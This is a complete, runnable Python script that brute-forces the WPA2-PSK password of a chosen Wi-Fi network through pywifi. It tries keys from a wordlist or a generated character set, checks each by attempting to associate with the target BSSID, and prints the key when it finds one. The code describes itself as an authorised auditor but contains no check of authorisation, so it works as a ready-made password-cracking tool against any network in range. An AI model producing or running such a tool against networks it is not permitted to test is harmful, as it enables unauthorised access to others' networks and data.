#!/usr/bin/env python3
"""Bounded WPA2-PSK auditor for an explicitly authorised local test network."""

import argparse
import signal
import sys
import time

from charset import PRESETS, generate, resolve_charset

signal.signal(signal.SIGPIPE, signal.SIG_DFL)


def normalize_bssid(value):
    return value.replace("-", ":").lower() if value else ""


def select_interface(wifi, name):
    for iface in wifi.interfaces():
        if iface.name() == name:
            return iface
    available = ", ".join(i.name() for i in wifi.interfaces()) or "none"
    raise RuntimeError(f"interface '{name}' not found (available: {available})")


def find_target_bssid(iface, ssid, requested=None):
    requested = normalize_bssid(requested)
    iface.scan()
    matches = [r for r in iface.scan_results() if getattr(r, "ssid", "") == ssid]
    if requested:
        matches = [r for r in matches if normalize_bssid(getattr(r, "bssid", "")) == requested]
    if not matches:
        raise RuntimeError(f"target SSID/BSSID not found: {ssid}")
    return normalize_bssid(getattr(matches[0], "bssid", ""))


def associated_bssid(iface):
    info = iface.associated_ap_info()
    return normalize_bssid(getattr(info, "bssid", ""))


def try_password(iface, profile, password, const, target_bssid, timeout):
    """Try one key without deleting any saved or unrelated network profile."""
    profile.key = password
    try:
        iface.disconnect()
        iface.connect(profile)
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if (iface.status() == const.IFACE_CONNECTED and
                    associated_bssid(iface) == target_bssid):
                return True
            time.sleep(min(0.2, max(0.01, deadline - time.monotonic())))
    except Exception as exc:
        print(f"[!] Wi-Fi backend error: {exc}", file=sys.stderr)
    finally:
        try:
            iface.disconnect()
        except Exception:
            pass
    return False


def main(argv=None, wifi_factory=None):
    parser = argparse.ArgumentParser(description="Audit an explicitly authorised WPA2-PSK hotspot.")
    parser.add_argument("--ssid", required=True, help="Target SSID")
    parser.add_argument("--bssid", help="Expected AP BSSID; otherwise resolved from a scan")
    parser.add_argument("--interface", default="wlan0", help="Wireless interface (default: wlan0)")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--wordlist", help="File with passwords (one per line)")
    group.add_argument("--charset", help=f"Generate passwords from charset or preset ({', '.join(sorted(PRESETS))})")
    parser.add_argument("--min", type=int, default=8)
    parser.add_argument("--max", type=int, default=8)
    parser.add_argument("--limit", type=int, default=0)
    parser.add_argument("--timeout", type=float, default=5.0, help="Seconds to wait per association")
    parser.add_argument("--backoff-base", type=float, default=0.5)
    parser.add_argument("--backoff-max", type=float, default=8.0)
    args = parser.parse_args(argv)
    if args.min < 1 or args.max < args.min or args.limit < 0 or args.timeout <= 0:
        parser.error("invalid length, limit, or timeout")

    try:
        import pywifi
        from pywifi import const
        wifi = (wifi_factory or pywifi.PyWiFi)()
        iface = select_interface(wifi, args.interface)
        target_bssid = find_target_bssid(iface, args.ssid, args.bssid)
    except (ImportError, RuntimeError, OSError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    print(f"[*] Using interface: {iface.name()}", file=sys.stderr)
    print(f"[*] Target SSID/BSSID: {args.ssid} / {target_bssid}", file=sys.stderr)
    profile = pywifi.Profile()
    profile.ssid = args.ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile = iface.add_network_profile(profile)

    source_file = open(args.wordlist, encoding="utf-8", errors="replace") if args.wordlist else None
    source = source_file or sys.stdin
    if args.charset:
        source = generate(resolve_charset(args.charset), args.min, args.max)
    attempts = 0
    failures = 0
    found = False
    try:
        for password in source:
            password = password.rstrip("\n\r")
            if not password:
                continue
            attempts += 1
            print(f"\r[*] Trying ({attempts})", end="", file=sys.stderr)
            sys.stderr.flush()
            if try_password(iface, profile, password, const, target_bssid, args.timeout):
                print(f"\n[+] FOUND PASSWORD: {password}", file=sys.stderr)
                print(password)
                found = True
                break
            failures += 1
            time.sleep(min(args.backoff_max, args.backoff_base * (2 ** min(failures - 1, 5))))
            if args.limit and attempts >= args.limit:
                print(f"\n[-] Reached limit of {args.limit} attempts", file=sys.stderr)
                break
    except KeyboardInterrupt:
        print(f"\n[-] Interrupted after {attempts} attempts", file=sys.stderr)
    finally:
        try:
            iface.disconnect()
        except Exception:
            pass
        if source_file:
            source_file.close()
    if not found:
        print(f"\n[-] Password not found after {attempts} attempts", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
